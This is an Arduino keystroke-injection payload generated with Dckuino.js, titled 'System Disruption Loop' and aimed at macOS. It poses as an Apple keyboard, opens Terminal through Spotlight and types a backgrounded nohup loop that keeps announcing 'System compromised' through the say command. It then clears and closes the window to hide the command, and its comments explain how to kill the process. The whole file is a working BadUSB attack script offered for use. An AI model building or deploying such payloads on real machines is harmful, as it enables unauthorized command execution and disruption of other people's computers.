// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script initiates a system disruption loop by
  // continuously generating warning messages using the "say" command in macOS.
  // Will continue to run after the terminal is closed
  // To end the loop you need to Kill the PID
  // Use the command <ps aux | grep 'sh -c while true; do say "Warning: System compromised. Initiating disruption."; done'>
  // to find the PID
  // Run the command 'Kill PID #' to end the warning message loop.
  // Author: Narsty
  // Title: System Disruption Loop
  // Target: MacOS
  // Version: 1.0
  // Category: Executions
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("nohup sh -c 'while true; do say \"Warning: System compromised. Initiating disruption.\"; done' >/dev/null 2>&1 &");

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('k');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}